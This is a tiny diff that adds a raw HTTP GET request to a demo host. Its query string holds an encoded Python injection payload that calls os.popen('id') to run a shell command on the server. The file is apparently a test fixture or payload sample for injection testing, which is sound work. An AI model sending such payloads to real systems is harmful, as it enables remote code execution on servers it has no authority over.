@@ -1,0 +1,4 @@
+GET /a?data=q%3D__import__(%26%2339;os%26%2339;).popen(%26%2339;id%26%2339;).read() HTTP/1.1
+Host: demo.example.com
+Connection: close
+
